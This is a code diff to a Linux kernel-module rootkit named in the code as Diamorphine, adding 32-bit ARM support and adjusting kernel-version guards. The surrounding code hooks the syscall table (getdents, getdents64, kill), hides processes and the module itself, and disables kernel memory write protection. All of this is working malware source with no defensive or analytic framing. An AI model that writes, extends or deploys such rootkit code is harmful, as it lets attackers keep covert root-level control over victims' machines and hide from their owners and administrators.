@@ -38,9 +38,12 @@ void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t si
 unsigned long start_rodata;
 unsigned long init_begin;
 #define section_size init_begin - start_rodata
+#elif IS_ENABLED(CONFIG_ARM)
+void (*set_kernel_text_rw)(void);
+void (*set_kernel_text_ro)(void);
 #endif
 static unsigned long *__sys_call_table;
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && IS_ENABLED(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
 	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
 	static t_syscall orig_getdents;
 	static t_syscall orig_getdents64;
@@ -110,7 +113,7 @@ is_invisible(pid_t pid)
 	return 0;
 }
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && IS_ENABLED(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	int fd = (int) pt_regs->di;
@@ -176,13 +179,13 @@ out:
 	return ret;
 }
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && IS_ENABLED(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
 static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	int fd = (int) pt_regs->di;
 	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
 #elif IS_ENABLED(CONFIG_ARM64)
-		int fd = (int) pt_regs->regs[0];
+	int fd = (int) pt_regs->regs[0];
 	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
 #endif
 	int ret = orig_getdents(pt_regs), err;
@@ -297,7 +300,7 @@ module_hide(void)
 	module_hidden = 1;
 }
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && IS_ENABLED(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
 asmlinkage int
 hacked_kill(const struct pt_regs *pt_regs)
 {
@@ -328,7 +331,7 @@ hacked_kill(pid_t pid, int sig)
 			else module_hide();
 			break;
 		default:
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && IS_ENABLED(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
 			return orig_kill(pt_regs);
 #else
 			return orig_kill(pid, sig);
@@ -361,7 +364,8 @@ protect_memory(void)
 #elif IS_ENABLED(CONFIG_ARM64)
 	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
 			section_size, PAGE_KERNEL_RO);
-
+#elif IS_ENABLED(CONFIG_ARM)
+	set_kernel_text_ro();
 #endif
 }
 
@@ -377,6 +381,8 @@ unprotect_memory(void)
 #elif IS_ENABLED(CONFIG_ARM64)
 	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
 			section_size, PAGE_KERNEL);
+#elif IS_ENABLED(CONFIG_ARM)
+	set_kernel_text_rw();
 #endif
 }
 
@@ -393,12 +399,15 @@ diamorphine_init(void)
 	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
 	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
 	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
+#elif IS_ENABLED(CONFIG_ARM)
+	set_kernel_text_rw = (void *)kallsyms_lookup_name("set_kernel_text_rw");
+	set_kernel_text_ro = (void *)kallsyms_lookup_name("set_kernel_text_ro");
 #endif
 
 	module_hide();
 	tidy();
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && IS_ENABLED(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
 	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
 	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
 	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
